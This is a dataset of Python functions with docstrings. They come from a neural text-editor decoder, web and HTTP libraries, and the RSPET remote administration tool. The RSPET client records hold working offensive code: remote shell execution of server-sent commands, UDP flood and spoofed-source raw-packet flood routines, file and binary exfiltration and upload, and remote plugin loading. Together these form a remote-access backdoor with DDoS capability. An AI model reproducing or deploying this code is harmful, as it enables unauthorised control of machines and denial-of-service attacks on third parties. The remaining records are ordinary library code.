{"docstring": "\"\"\"Extract prefix hints at time t.\n\nArgs:\n    prefix_hints (list[list[unicode]]): a batch of prefixes, one per example.\n    t (int): the time index to pull out\n    beam_size (int)\n\nReturns:\n    list[unicode]: prefix hints at time t, of length len(prefix_hints) * beam_size.\n\"\"\"\n", "func_signal": "def _prefix_hints_at_time_t(cls, prefix_hints, t, beam_size):\n", "code": "hints_at_t = []\nfor prefix in prefix_hints:\n    if t >= len(prefix):\n        hint = None\n    else:\n        hint = prefix[t]\n    hints_at_t.extend([hint] * beam_size)\nreturn hints_at_t", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Load SimpleVocab from file path.\n\nArgs:\n    path (str)\n\nReturns:\n    SimpleVocab\n\"\"\"\n", "func_signal": "def load(cls, path):\n", "code": "strip_newline = lambda s: s[:-1]\nwith open(path, 'r') as f:\n    tokens = [strip_newline(line) for line in f]\nreturn cls(tokens)", "path": "third-party\\gtd\\gtd\\ml\\vocab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Return the list of states up to and including this DecoderState.\"\"\"\n", "func_signal": "def sequence(self):\n", "code": "states_reversed = []\nstate = self\nwhile state:\n    states_reversed.append(state)\n    state = state.prev\nreturn list(reversed(states_reversed))", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"For each beam in extension_probs, select <beam_size> elements to continue.\n\nArgs:\n    extension_probs (np.ndarray): of shape (batch_size, vocab_size). Containing the probability of\n        every extension of every element in the batch.\n    beam_size (int): must satisfy batch_size % beam_size == 0\n\nReturns:\n    batch_indices (np.ndarray): 1D array, batch indices of the top extensions\n    token_indices (np.ndarray): 1D array, token indices of the top extensions\n\"\"\"\n", "func_signal": "def _select_extensions(cls, extension_probs, beam_size):\n", "code": "batch_size, vocab_size = extension_probs.shape\nnum_beams = batch_size / beam_size\nassert batch_size % beam_size == 0\n\nbeam_probs = np.reshape(extension_probs, (num_beams, vocab_size * beam_size))\ntop_indices = np.argsort(-beam_probs, axis=1)  # TODO: do this in PyTorch\ntop_indices = top_indices[:, :beam_size]  # (num_beams, beam_size)\n\nassert top_indices.dtype == np.int64  # going to do int arithmetic with this\n\nbeam_indices = np.expand_dims(np.arange(num_beams), 1)  # (num_beams, 1)\n\nbatch_indices = beam_indices * beam_size + top_indices / vocab_size\ntoken_indices = top_indices % vocab_size\n\nreturn batch_indices.flatten(), token_indices.flatten()", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "# create decoder_traces\n", "func_signal": "def _recover_sequences(cls, states_over_time, beam_size, top_k):\n", "code": "ex_idx_to_beam_traces = defaultdict(list)\nfor t, states in enumerate(states_over_time):\n    assert len(states) % beam_size == 0\n    beams = list(chunks(states, beam_size))\n    for ex_idx, beam in enumerate(beams):\n        trace = BeamTrace(beam, top_k)\n        ex_idx_to_beam_traces[ex_idx].append(trace)\n\ndecoder_traces = []\nfor ex_idx in range(max(ex_idx_to_beam_traces.keys()) + 1):\n    beam_traces = ex_idx_to_beam_traces[ex_idx]\n    decoder_traces.append(BeamDecoderTrace(beam_traces))\n\nfinal_state_beams = list(chunks(states_over_time[-1], beam_size))\noutput_beams = [[state.token_sequence for state in state_beam] for state_beam in final_state_beams]\n\nreturn output_beams, decoder_traces", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\nReturn an image object that can be immediately plotted with matplotlib\n\"\"\"\n", "func_signal": "def load_img(self, img_path):\n", "code": "with open_file(self.uuid, img_path) as f:\n    return mpimg.imread(f)", "path": "third-party\\gtd\\gtd\\codalab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Save SimpleVocab to file path.\n\nArgs:\n    path (str)\n\"\"\"\n", "func_signal": "def save(self, path):\n", "code": "with open(path, 'w') as f:\n    for word in self._index2word:\n        f.write(word)\n        f.write('\\n')", "path": "third-party\\gtd\\gtd\\ml\\vocab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Map a word to an integer.\n\nAutomatically lower-cases the word before mapping it.\n\nIf the word is not known to the vocab, return the index for UNK.\n\"\"\"\n", "func_signal": "def word2index(self, w):\n", "code": "sup = super(WordVocab, self)\ntry:\n    return sup.word2index(w.lower())\nexcept KeyError:\n    return sup.word2index(self.UNK)", "path": "third-party\\gtd\\gtd\\ml\\vocab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Advance the RNN state.\n\nArgs:\n    token_embedder (TokenEmbedder)\n    decoder_cell (DecoderCell)\n    rnn_context_combiner (RNNContextCombiner)\n    encoder_output (EncoderOutput)\n    rnn_state (RNNState)\n    states (list[DecoderState])\n\nReturns:\n    rnn_state (RNNState)\n    predictions (PredictionBatch)\n\"\"\"\n\n# apply decoder cell, update hidden states\n", "func_signal": "def _advance_rnn(self, token_embedder, decoder_cell, rnn_context_combiner, encoder_output, rnn_state, states):\n", "code": "previous_words = [state.token for state in states]  # get latest words\nadvance = GPUVariable(torch.ones(len(states), 1))\n\n# advance the RNN\nx = token_embedder.embed_tokens(previous_words)\nrnn_input = rnn_context_combiner(encoder_output, x)\ndc_output = decoder_cell(rnn_state, rnn_input, advance)\nrnn_state = dc_output.rnn_state\n\n# make predictions for the entire batch\npredictions = dc_output.predictions\nvocab = dc_output.vocab\ntoken_probs = predictions.probs  # (batch_size, vocab_size)\n\n# terminated sequence can only be extended with <stop>\nterminated_indices = np.array([i for i, state in enumerate(states) if state.terminated], dtype=np.int32)\nstop_idx = vocab.word2index(WordVocab.STOP)\ntoken_probs[terminated_indices, :] = 0.0\ntoken_probs[terminated_indices, stop_idx] = 1.0\n# NOTE: we have modified token_probs in-place. Hence, we have modified predictions in-place.\n\nreturn rnn_state, predictions", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Get the raw file content within a particular bundle at a particular path.\n\nPath have no leading slash.\n\"\"\"\n# create temporary file just so we can get an unused file path\n", "func_signal": "def open_file(uuid, path):\n", "code": "f = tempfile.NamedTemporaryFile()\nf.close()  # close and delete right away\nfname = f.name\n\n# download file to temporary path\ncmd ='cl down -o {} -w {} {}/{}'.format(fname, worksheet, uuid, path)\ntry:\n   shell(cmd)\nexcept RuntimeError:\n    try:\n       os.remove(fname)  # if file exists, remove it\n    except OSError:\n        pass\n    raise IOError('Failed to open file {}/{}'.format(uuid, path))\n\nf = open(fname)\nyield f\nf.close()\nos.remove(fname)  # delete temp file", "path": "third-party\\gtd\\gtd\\codalab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Construct BeamDecoder.\n\nArgs:\n    decoder_cell (DecoderCell)\n    token_embedder (TokenEmbedder)\n    rnn_context_combiner (RNNContextCombiner)\n\n\"\"\"\n", "func_signal": "def __init__(self, decoder_cell, token_embedder, rnn_context_combiner):\n", "code": "self.decoder_cell = decoder_cell\nself.word_vocab = token_embedder.vocab\nself.token_embedder = token_embedder\nself.word_dim = token_embedder.embed_dim\nself.rnn_context_combiner = rnn_context_combiner", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Get target ip and port from server, start UPD flood wait for 'KILL'.\"\"\"\n", "func_signal": "def udp_flood(self):\n", "code": "en_data = self.receive(3) # Max ip+port+payload length 999 chars\nen_data = self.receive(int(en_data))\nen_data = en_data.split(\":\")\ntarget_ip = en_data[0]\ntarget_port = int(en_data[1])\nmsg = en_data[2]\nproc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))\nproc.start()\nkilled = False\nwhile not killed:\n    en_data = self.receive(5)\n    try:\n        en_data = self.comm_dict[en_data]\n    except KeyError:\n        continue\n    if en_data == 'KILL':\n        proc.terminate()\n        killed = True\nreturn 0", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Called when a Plugin derived class is imported\n\nGathers all methods needed from __cmd_states__ to __server_cmds__\"\"\"\n\n", "func_signal": "def __init__(cls, name, base, attr):\n", "code": "tmp = cls()\nfor fn in cls.__client_cmds__:\n    # Load the function (if its from the current plugin) and see if\n    # it's marked. All plugins' commands are saved as function names\n    # without saving from which plugin they come, so we have to mark\n    # them and try to load them\n\n    if cls.__client_cmds__ is not None:\n        continue\n\n    try:\n        f = getattr(tmp, fn)\n        if f.__is_command__:\n            cls.__server_cmds__[fn] = f\n    except AttributeError:\n        pass", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Pull a regular text file from the host.\n\nHelp: <remote_file> [local_file]\"\"\"\n", "func_signal": "def pull_file(self, server, args):\n", "code": "ret = [None,0,\"\"]\nhost = server.get_selected()[0]\nif len(args) == 0:\n    ret[2] = (\"Syntax : %s\" % self.__cmd_help__[\"Pull_File\"])\n    ret[1] = 1 # Invalid Syntax Error Code\nelse:\n    remote_file = args[0]\n    try:\n        local_file = args[1]\n    except IndexError:\n        local_file = remote_file\n    try:\n        host.send(host.command_dict['sendFile'])\n        host.send(\"%03d\" % len(remote_file))\n        host.send(remote_file)\n        if host.recv(3) == \"fna\":\n            ret[2] += \"File does not exist or Access Denied\"\n            ret[1] = 4 # Remote Access Denied Error Code\n        else:\n            try:\n                with open(local_file, \"w\") as file_obj:\n                    filesize = int(host.recv(13))\n                    file_obj.write(host.recv(filesize))\n            except IOError:\n                ret[2] += \"Cannot create local file\"\n                ret[1] = 3 # Local Access Denied Error Code\n    except sock_error:\n        host.purge()\n        ret[0] = \"basic\"\n        ret[1] = 2 # Socket Error Code\nreturn ret", "path": "Server\\Plugins\\files.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Send data to Server.\"\"\"\n", "func_signal": "def send(self, data):\n", "code": "r_code = 0\ntry:\n    self.sock.send(data)\nexcept sock_error:\n    r_code = 1\n    self.reconnect()\nreturn r_code", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Get platform info.\"\"\"\n", "func_signal": "def sys_info():\n", "code": "import platform\nsys_info_tup = platform.uname()\nreturn (sys_info_tup[0], sys_info_tup[1])", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Asyncronously unload a plugin.\"\"\"\n", "func_signal": "def unload_plugin(self):\n", "code": "en_data = self.receive(3) # Max plugin name length 999 chars\nen_data = self.receive(int(en_data))\n\ntry:\n    del self.loaded_plugins[en_data]\nexcept ImportError:\n    pass", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Attempt to reconnect after connection loss.\"\"\"\n# Take an exponential backoff-ish approach\n", "func_signal": "def reconnect(self):\n", "code": "c_factor = 0\nconnected = False\nwhile not connected:\n    try:\n        self.connect()\n    except sock_error:\n        sleep(exponential_backoff(c_factor))\n        c_factor += 1\n    else:\n        connected = True", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Spoof a packet and send it to target_ip, target_port.\n\nKeyword argument(s):\ntarget_ip -- the desired destination ip\ntarget_port -- the desired destination port\nspoofed_ip -- the desired source ip\nspoofed_port -- the desired source port\n\"\"\"\n", "func_signal": "def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):\n", "code": "spoofed_packet = udp_spoof_pck(target_ip, target_port, spoofed_ip,\n                               spoofed_port, payload)\nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)\nwhile True:\n    sock.sendto(spoofed_packet, (target_ip, target_port))\n    sleep(0.01)", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Get binary name from server, send contents back.\"\"\"\n", "func_signal": "def send_binary(self):\n", "code": "exit_code = 0\nbname_length = self.receive(3) # Filename length up to 999 chars\nbname = self.receive(int(bname_length))\ntry:\n    bin_to_send = open(bname, 'rb')\n    stdout = 'fos'\nexcept IOError:\n    stdout = 'fna'\n    exit_code = 1\n    en_stdout = self.send(stdout)\nelse:\n    en_stdout = self.send(stdout)\n    if en_stdout == 0:\n        bin_cont = bin_to_send.read()\n        bin_to_send.close()\n        stdout = get_len(bin_cont, 13)\n        en_stdout = self.send(stdout)\n        if en_stdout == 0:\n            stdout = bin_cont\n            en_stdout = self.send(stdout)\n    else:\n        bin_to_send.close()\nreturn exit_code", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Send a binary file to the host(s).\n\nHelp: <local_bin> [remote_bin]\"\"\"\n", "func_signal": "def make_binary(self, server, args):\n", "code": "ret = [None,0,\"\"]\nhosts = server.get_selected()\nif len(args) == 0:\n    ret[2] = (\"Syntax : %s\" % self.__cmd_help__[\"Make_Binary\"])\n    ret[1] = 1 # Invalid Syntax Error Code\nelse:\n    local_file = args[0]\n    try:\n        remote_file = args[1]\n    except IndexError:\n        remote_file = local_file.split(\"/\")[-1]\n    for host in hosts:\n        try:\n            host.send(host.command_dict['getBinary'])\n            host.send(\"%03d\" % len(remote_file))\n            host.send(remote_file)\n            if host.recv(3) == \"fna\":\n                ret[2] += \"Access Denied\"\n                ret[1] = 4 # Remote Access Denied Error Code\n            else:\n                with open(local_file, \"rb\") as file_obj:\n                    contents = file_obj.read()\n                    host.send(\"%013d\" % len(contents))\n                    host.send(contents)\n                    host.recv(3) # For future use?\n        except sock_error:\n            host.purge()\n            ret[0] = \"basic\"\n            ret[1] = 2 # Socket Error Code\n        except IOError:\n            ret[1] = 3 # LocalAccessError Code\n            ret[2] += \"File not found!\"\nreturn ret", "path": "Server\\Plugins\\files.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Get command to run from server, execute it and send results back.\"\"\"\n", "func_signal": "def run_cm(self):\n", "code": "command_size = self.receive(13)\ncommand = self.receive(int(command_size))\ncomm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)\nstdout, stderr = comm.communicate()\nif stderr:\n    decode = stderr.decode('UTF-8')\nelif stdout:\n    decode = stdout.decode('UTF-8')\nelse:\n    decode = 'Command has no output'\nlen_decode = get_len(decode, 13)\nen_stdout = self.send(len_decode)\nif en_stdout == 0:\n    en_stdout = self.send(decode)\nreturn 0", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Create and return a spoofed UDP packet.\n\nKeyword argument(s):\ndest_ip -- the desired destination ip\ndest_port -- the desired destination port\nsource_ip -- the desired source ip\nsource_port -- the desired source port\n\"\"\"\n", "func_signal": "def udp_spoof_pck(dest_ip, dest_port, source_ip, source_port, payload):\n", "code": "from pinject import UDP, IP\nudp_header = UDP(source_port, dest_port, payload).pack(source_ip, dest_ip)\nip_header = IP(source_ip, dest_ip, udp_header, IPPROTO_UDP).pack()\nreturn ip_header+udp_header+payload", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Client's main body. Accept and execute commands.\"\"\"\n", "func_signal": "def loop(self):\n", "code": "while not self.quit_signal:\n    en_data = self.receive(5)\n    try:\n        en_data = self.comm_dict[en_data]\n    except KeyError:\n        if en_data == '':\n            self.reconnect()\n        continue\n    self.comm_swtch[en_data]()\nself.sock.shutdown(SHUT_RDWR)\nself.sock.close()", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Get file name from server, send contents back.\"\"\"\n", "func_signal": "def send_file(self):\n", "code": "exit_code = 0\nfname_length = self.receive(3) # Filename length up to 999 chars\nfname = self.receive(int(fname_length))\ntry:\n    file_to_send = open(fname, 'r')\n    stdout = 'fos'\nexcept IOError:\n    stdout = 'fna'\n    exit_code = 1\n    en_stdout = self.send(stdout)\nelse:\n    en_stdout = self.send(stdout)\n    if en_stdout == 0:\n        file_cont = file_to_send.read()\n        file_to_send.close()\n        stdout = get_len(file_cont, 13)\n        en_stdout = self.send(stdout)\n        if en_stdout == 0:\n            stdout = file_cont\n            en_stdout = self.send(stdout)\n    else:\n        file_to_send.close()\nreturn exit_code", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Get file name and contents from server, create file.\"\"\"\n", "func_signal": "def get_file(self):\n", "code": "exit_code = 0\nfname_length = self.receive(3) # Filename length up to 999 chars\nfname = self.receive(int(fname_length))\ntry:\n    file_to_write = open(fname, 'w')\n    stdout = 'fcs'\nexcept IOError:\n    stdout = 'fna'\n    exit_code = 1\n    en_stdout = self.send(stdout)\nelse:\n    en_stdout = self.send(stdout)\n    if en_stdout == 0:\n        f_size = self.receive(13) # File size up to 9999999999999 chars\n        en_data = self.receive(int(f_size))\n        file_to_write.write(en_data)\n        file_to_write.close()\n        stdout = \"fsw\"\n        en_stdout = self.send(stdout)\n    else:\n        file_to_write.close()\nreturn exit_code", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Get binary name and contents from server, create binary.\"\"\"\n", "func_signal": "def get_binary(self):\n", "code": "exit_code = 0\nbname_length = self.receive(3) # Filename length up to 999 chars\nbname = self.receive(int(bname_length))\ntry:\n    bin_to_write = open(bname, 'wb')\n    stdout = 'fcs'\nexcept IOError:\n    stdout = 'fna'\n    exit_code = 1\n    en_stdout = self.send(stdout)\nelse:\n    en_stdout = self.send(stdout)\n    if en_stdout == 0:\n        b_size = self.receive(13) # Binary size up to 9999999999999 symbols\n        en_data = self.receive(int(b_size))\n        bin_to_write.write(en_data)\n        bin_to_write.close()\n        stdout = \"fsw\"\n        en_stdout = self.send(stdout)\n    else:\n        bin_to_write.close()\nreturn exit_code", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Pull a binary file from the host.\n\nHelp: <remote_bin> [local_bin]\"\"\"\n", "func_signal": "def pull_binary(self, server, args):\n", "code": "ret = [None,0,\"\"]\nhost = server.get_selected()[0]\nif len(args) == 0:\n    ret[2] = (\"Syntax : %s\" % self.__cmd_help__[\"Pull_Binary\"])\n    ret[1] = 1 # Invalid Syntax Error Code\nelse:\n    remote_file = args[0]\n    try:\n        local_file = args[1]\n    except IndexError:\n        local_file = remote_file\n    try:\n        host.send(host.command_dict['sendBinary'])\n        host.send(\"%03d\" % len(remote_file))\n        host.send(remote_file)\n        if host.recv(3) == \"fna\":\n            ret[2] += \"File does not exist or Access Denied\"\n            ret[1] = 4 # Remote Access Denied Error Code\n        else:\n            try:\n                with open(local_file, \"wb\") as file_obj:\n                    filesize = int(host.recv(13))\n                    file_obj.write(host.recv(filesize))\n            except IOError:\n                ret[2] += \"Cannot create local file\"\n                ret[1] = 3 # Local Access Denied Error Code\n    except sock_error:\n        host.purge()\n        ret[0] = \"basic\"\n        ret[1] = 2 # Socket Error Code\nreturn ret", "path": "Server\\Plugins\\files.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Send a regular text file to the host(s).\n\nHelp: <local_file> [remote_file]\"\"\"\n", "func_signal": "def make_file(self, server, args):\n", "code": "ret = [None,0,\"\"]\nhosts = server.get_selected()\nif len(args) == 0:\n    ret[2] = (\"Syntax : %s\" % self.__cmd_help__[\"Make_File\"])\n    ret[1] = 1 # Invalid Syntax Error Code\nelse:\n    local_file = args[0]\n    try:\n        remote_file = args[1]\n    except IndexError:\n        remote_file = local_file.split(\"/\")[-1]\n    for host in hosts:\n        try:\n            host.send(host.command_dict['getFile'])\n            host.send(\"%03d\" % len(remote_file))\n            host.send(remote_file)\n            if host.recv(3) == \"fna\":\n                ret[2] += \"Access Denied\"\n                ret[1] = 4 # Remote Access Denied Error Code\n            else:\n                with open(local_file) as file_obj:\n                    contents = file_obj.read()\n                    host.send(\"%013d\" % len(contents))\n                    host.send(contents)\n                    host.recv(3) # For future use?\n        except sock_error:\n            host.purge()\n            ret[0] = \"basic\"\n            ret[1] = 2 # Socket Error Code\n        except IOError:\n            ret[1] = 3 # LocalAccessError Code\n            ret[2] += \"File not found!\"\nreturn ret", "path": "Server\\Plugins\\files.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Create UDP packet and send it to target_ip, target_port.\"\"\"\n", "func_signal": "def udp_flood_start(target_ip, target_port, msg):\n", "code": "flood_sock = socket(AF_INET, SOCK_DGRAM)\nwhile True:\n    flood_sock.sendto(bytes(msg), (target_ip, target_port))\n    sleep(0.01)", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"Asyncronously load a plugin.\"\"\"\n", "func_signal": "def load_plugin(self):\n", "code": "en_data = self.receive(3) # Max plugin name length 999 chars\nen_data = self.receive(int(en_data))\n\ntry:\n    self.plugins[en_data] = __import__(en_data)\n    self.send(\"psl\")\nexcept ImportError:\n    self.send(\"pnl\")", "path": "Client\\rspet_client.py", "repo_name": "panagiks/RSPET", "stars": 258, "license": "mit", "language": "python", "size": 467}
{"docstring": "\"\"\"\nheaders: sequence of (name, value) pairs\n\"\"\"\n", "func_signal": "def make_headers(headers):\n", "code": "hdr_text = []\nfor name_value in headers:\n    hdr_text.append(\"%s: %s\" % name_value)\nreturn mimetools.Message(StringIO(\"\\n\".join(hdr_text)))", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Reads a file into a list of strings.  It calls :meth:`readline`\nuntil the file is read to the end.  It does support the optional\n`size` argument if the underlaying stream supports it for\n`readline`.\n\"\"\"\n", "func_signal": "def readlines(self, size=None):\n", "code": "last_pos = self._pos\nresult = []\nif size is not None:\n    end = min(self.limit, last_pos + size)\nelse:\n    end = self.limit\nwhile 1:\n    if size is not None:\n        size -= last_pos - self._pos\n    if self._pos >= end:\n        break\n    result.append(self.readline(size))\n    if size is not None:\n        last_pos = self._pos\nreturn result", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Reads one line from the stream.\"\"\"\n", "func_signal": "def readline(self, size=None):\n", "code": "if self._pos >= self.limit:\n    return self.on_exhausted()\nif size is None:\n    size = self.limit - self._pos\nelse:\n    size = min(size, self.limit - self._pos)\ntry:\n    line = self._readline(size)\nexcept (ValueError, IOError):\n    return self.on_disconnect()\nif size and not line:\n    return self.on_disconnect()\nself._pos += len(line)\nreturn line", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Return a copy of response that supports Browser response interface.\n\nBrowser response interface is that of \"seekable responses\"\n(response_seek_wrapper), plus the requirement that responses must be\nuseable after .close() (closeable_response).\n\nAccepts responses from both mechanize and urllib2 handlers.\n\nCopes with both ordinary response instances and HTTPError instances (which\ncan't be simply wrapped due to the requirement of preserving the exception\nbase class).\n\"\"\"\n", "func_signal": "def upgrade_response(response):\n", "code": "wrapper_class = get_seek_wrapper_class(response)\nif hasattr(response, \"closeable_response\"):\n    if not hasattr(response, \"seek\"):\n        response = wrapper_class(response)\n    assert hasattr(response, \"get_data\")\n    return copy.copy(response)\n\n# a urllib2 handler constructed the response, i.e. the response is an\n# urllib.addinfourl or a urllib2.HTTPError, instead of a\n# _Util.closeable_response as returned by e.g. mechanize.HTTPHandler\ntry:\n    code = response.code\nexcept AttributeError:\n    code = None\ntry:\n    msg = response.msg\nexcept AttributeError:\n    msg = None\n\n# may have already-.read() data from .seek() cache\ndata = None\nget_data = getattr(response, \"get_data\", None)\nif get_data:\n    data = get_data()\n\nresponse = closeable_response(\n    response.fp, response.info(), response.geturl(), code, msg)\nresponse = wrapper_class(response)\nif data:\n    response.set_data(data)\nreturn response", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Removes and returns the next segment of `PATH_INFO`, pushing it onto\n`SCRIPT_NAME`.  Returns `None` if there is nothing left on `PATH_INFO`.\n\nIf there are empty segments (``'/foo//bar``) these are ignored but\nproperly pushed to the `SCRIPT_NAME`:\n\n>>> env = {'SCRIPT_NAME': '/foo', 'PATH_INFO': '/a/b'}\n>>> pop_path_info(env)\n'a'\n>>> env['SCRIPT_NAME']\n'/foo/a'\n>>> pop_path_info(env)\n'b'\n>>> env['SCRIPT_NAME']\n'/foo/a/b'\n\n.. versionadded:: 0.5\n\n:param environ: the WSGI environment that is modified.\n\"\"\"\n", "func_signal": "def pop_path_info(environ):\n", "code": "path = environ.get('PATH_INFO')\nif not path:\n    return None\n\nscript_name = environ.get('SCRIPT_NAME', '')\n\n# shift multiple leading slashes over\nold_path = path\npath = path.lstrip('/')\nif path != old_path:\n    script_name += '/' * (len(old_path) - len(path))\n\nif '/' not in path:\n    environ['PATH_INFO'] = ''\n    environ['SCRIPT_NAME'] = script_name + path\n    return path\n\nsegment, path = path.split('/', 1)\nenviron['PATH_INFO'] = '/' + path\nenviron['SCRIPT_NAME'] = script_name + segment\nreturn segment", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "# Performs the NTLM handshake that secures the connection. The socket\n# must be kept open while requests are performed.\n", "func_signal": "def _new_conn(self):\n", "code": "self.num_connections += 1\nlog.debug('Starting NTLM HTTPS connection no. %d: https://%s%s' %\n          (self.num_connections, self.host, self.authurl))\n\nheaders = {}\nheaders['Connection'] = 'Keep-Alive'\nreq_header = 'Authorization'\nresp_header = 'www-authenticate'\n\nconn = HTTPSConnection(host=self.host, port=self.port)\n\n# Send negotiation message\nheaders[req_header] = (\n    'NTLM %s' % ntlm.create_NTLM_NEGOTIATE_MESSAGE(self.rawuser))\nlog.debug('Request headers: %s' % headers)\nconn.request('GET', self.authurl, None, headers)\nres = conn.getresponse()\nreshdr = dict(res.getheaders())\nlog.debug('Response status: %s %s' % (res.status, res.reason))\nlog.debug('Response headers: %s' % reshdr)\nlog.debug('Response data: %s [...]' % res.read(100))\n\n# Remove the reference to the socket, so that it can not be closed by\n# the response object (we want to keep the socket open)\nres.fp = None\n\n# Server should respond with a challenge message\nauth_header_values = reshdr[resp_header].split(', ')\nauth_header_value = None\nfor s in auth_header_values:\n    if s[:5] == 'NTLM ':\n        auth_header_value = s[5:]\nif auth_header_value is None:\n    raise Exception('Unexpected %s response header: %s' %\n                    (resp_header, reshdr[resp_header]))\n\n# Send authentication message\nServerChallenge, NegotiateFlags = \\\n    ntlm.parse_NTLM_CHALLENGE_MESSAGE(auth_header_value)\nauth_msg = ntlm.create_NTLM_AUTHENTICATE_MESSAGE(ServerChallenge,\n                                                 self.user,\n                                                 self.domain,\n                                                 self.pw,\n                                                 NegotiateFlags)\nheaders[req_header] = 'NTLM %s' % auth_msg\nlog.debug('Request headers: %s' % headers)\nconn.request('GET', self.authurl, None, headers)\nres = conn.getresponse()\nlog.debug('Response status: %s %s' % (res.status, res.reason))\nlog.debug('Response headers: %s' % dict(res.getheaders()))\nlog.debug('Response data: %s [...]' % res.read()[:100])\nif res.status != 200:\n    if res.status == 401:\n        raise Exception('Server rejected request: wrong '\n                        'username or password')\n    raise Exception('Wrong server response: %s %s' %\n                    (res.status, res.reason))\n\nres.fp = None\nlog.debug('Connection established')\nreturn conn", "path": "NZBmegasearch\\requests\\packages\\urllib3\\contrib\\ntlmpool.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
